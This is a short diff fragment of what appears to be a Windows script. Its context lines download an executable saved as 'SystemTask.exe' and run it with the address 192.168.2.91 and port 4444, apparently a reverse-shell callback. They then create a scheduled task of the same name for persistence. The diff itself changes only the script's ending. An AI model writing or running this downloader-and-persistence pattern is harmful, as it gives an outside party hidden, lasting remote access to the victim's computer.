@@ -7,4 +7,5 @@ $file = 'SystemTask.exe'
 $client.DownloadFile($url,$file)
 SystemTask.exe "192.168.2.91" "4444"
 schtasks.exe /create /tn "SystemTask" /xml SystemTask.xml
-exit
+:END
+@pause
